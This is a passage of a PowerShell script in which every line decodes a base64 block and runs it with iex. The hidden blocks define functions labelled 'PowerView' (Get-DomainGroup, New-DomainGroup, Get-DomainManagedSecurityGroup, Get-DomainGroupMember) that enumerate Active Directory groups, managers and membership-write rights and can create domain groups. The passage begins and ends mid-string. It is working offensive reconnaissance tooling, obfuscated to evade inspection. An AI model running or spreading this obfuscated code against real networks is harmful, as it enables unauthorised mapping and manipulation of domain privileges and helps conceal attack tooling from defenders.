yb3BlcnR5ICckR3JvdXBQcm9wZXJ0eVZhbHVlJyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PWdyb3VwKSRGaWx0ZXIpIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cF0gZmlsdGVyIHN0cmluZzogJCgkR3JvdXBTZWFyY2hlci5maWx0ZXIpIgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJEdyb3VwU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRHcm91cFNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cCA9ICRfCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXAgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRHcm91cC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR3JvdXAnKQogICAgICAgICAgICAgICAgICAgICRHcm91cAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR3JvdXBdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3QiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LURvbWFpbkdyb3VwIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTGVuZ3RoKDAsIDI1NildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2FtQWNjb3VudE5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICROYW1lLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRGlzcGxheU5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREZXNjcmlwdGlvbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgICRDb250ZXh0QXJndW1lbnRzID0gQHsKICAgICAgICAnSWRlbnRpdHknID0gJFNhbUFjY291bnROYW1lCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgJENvbnRleHQgPSBHZXQtUHJpbmNpcGFsQ29udGV4dCBAQ29udGV4dEFyZ3VtZW50cwogICAgaWYgKCRDb250ZXh0KSB7CiAgICAgICAgJEdyb3VwID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsIC1Bcmd1bWVudExpc3QgKCRDb250ZXh0LkNvbnRleHQpCiAgICAgICAgJEdyb3VwLlNhbUFjY291bnROYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydOYW1lJ10pIHsKICAgICAgICAgICAgJEdyb3VwLk5hbWUgPSAkTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwLk5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEaXNwbGF5TmFtZSddKSB7CiAgICAgICAgICAgICRHcm91cC5EaXNwbGF5TmFtZSA9ICREaXNwbGF5TmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwLkRpc3BsYXlOYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVzY3JpcHRpb24nXSkgewogICAgICAgICAgICAkR3JvdXAuRGVzY3JpcHRpb24gPSAkRGVzY3JpcHRpb24KICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1Eb21haW5Hcm91cF0gQXR0ZW1wdGluZyB0byBjcmVhdGUgZ3JvdXAgJyRTYW1BY2NvdW50TmFtZSciCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJE51bGwgPSAkR3JvdXAuU2F2ZSgpCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctRG9tYWluR3JvdXBdIEdyb3VwICckU2FtQWNjb3VudE5hbWUnIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIgogICAgICAgICAgICAkR3JvdXAKICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbTmV3LURvbWFpbkdyb3VwXSBFcnJvciBjcmVhdGluZyBncm91cCAnJFNhbUFjY291bnROYW1lJyA6ICRfIgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk1hbmFnZWRTZWN1cml0eUdyb3VwIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lk1hbmFnZWRTZWN1cml0eUdyb3VwJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdMREFQRmlsdGVyJyA9ICcoJihtYW5hZ2VkQnk9KikoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIxNDc0ODM2NDgpKScKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWROYW1lLG1hbmFnZWRCeSxzYW1hY2NvdW50dHlwZSxzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluCiAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJEVudjpVU0VSRE5TRE9NQUlOCiAgICAgICAgfQogICAgICAgIEdldC1Eb21haW5Hcm91cCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lLG5hbWUsc2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsb2JqZWN0c2lkJwogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkXy5tYW5hZ2VkQnkKICAgICAgICAgICAgJE51bGwgPSAkU2VhcmNoZXJBcmd1bWVudHMuUmVtb3ZlKCdMREFQRmlsdGVyJykKICAgICAgICAgICAgJEdyb3VwTWFuYWdlciA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkXy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRGlzdGluZ3Vpc2hlZE5hbWUnICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlck5hbWUnICRHcm91cE1hbmFnZXIuc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgJE1hbmFnZWRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNYW5hZ2VyRGlzdGluZ3Vpc2hlZE5hbWUnICRHcm91cE1hbmFnZXIuZGlzdGluZ3Vpc2hlZE5hbWUKICAgICAgICAgICAgaWYgKCRHcm91cE1hbmFnZXIuc2FtYWNjb3VudHR5cGUgLWVxIDB4MTAwMDAwMDApIHsKICAgICAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlclR5cGUnICdHcm91cCcKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRHcm91cE1hbmFnZXIuc2FtYWNjb3VudHR5cGUgLWVxIDB4MzAwMDAwMDApIHsKICAgICAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlclR5cGUnICdVc2VyJwogICAgICAgICAgICB9CiAgICAgICAgICAgICRBQ0xBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0lkZW50aXR5JyA9ICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAnUmlnaHRzRmlsdGVyJyA9ICdXcml0ZU1lbWJlcnMnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEFDTEFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQUNMQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQUNMQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJEFDTEFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJEFDTEFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBQ0xBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgJE1hbmFnZWRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNYW5hZ2VyQ2FuV3JpdGUnICdVTktOT1dOJwogICAgICAgICAgICAkTWFuYWdlZEdyb3VwLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5NYW5hZ2VkU2VjdXJpdHlHcm91cCcpCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdyb3VwTWVtYmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Hcm91cE1lbWJlcicpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnTm9uZScpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScsICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScsICdNZW1iZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTWFudWFsUmVjdXJzZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlY3Vyc2UsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ1JlY3Vyc2VVc2luZ01hdGNoaW5nUnVsZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlY3Vyc2VVc2luZ01hdGNoaW5nUnVsZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ21lbWJlcixzYW1hY2NvdW50bmFtZSxkaXN0aW5ndWlzaGVkbmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEFETmFtZUFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFETmFtZUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgJEdyb3VwU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgaWYgKCRHcm91cFNlYXJjaGVyKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JlY3Vyc2VVc2luZ01hdGNoaW5nUnVsZSddKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkSWRlbnRpdHkKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUmF3J10gPSAkVHJ1ZQogICAgICAgICAgICAgICAgJEdyb3VwID0gR2V0LURvbWFpbkdyb3VwIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgaWYgKC1ub3QgJEdyb3VwKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5OiAkSWRlbnRpdHkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZE5hbWUgPSAkR3JvdXAucHJvcGVydGllcy5pdGVtKCdzYW1hY2NvdW50bmFtZScpWzBdCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmRETiA9ICRHcm91cC5wcm9wZXJ0aWVzLml0ZW0oJ2Rpc3Rpbmd1aXNoZWRuYW1lJylbMF0KICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZERvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBGb3VuZEROKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBGb3VuZERvbWFpbiA9ICRHcm91cEZvdW5kRE4uU3ViU3RyaW5nKCRHcm91cEZvdW5kRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBVc2luZyBMREFQIG1hdGNoaW5nIHJ1bGUgdG8gcmVjdXJzZSBvbiAnJEdyb3VwRm91bmRETicsIG9ubHkgdXNlciBhY2NvdW50cyB3aWxsIGJlIHJldHVybmVkLiIKICAgICAgICAgICAgICAgICAgICAkR3J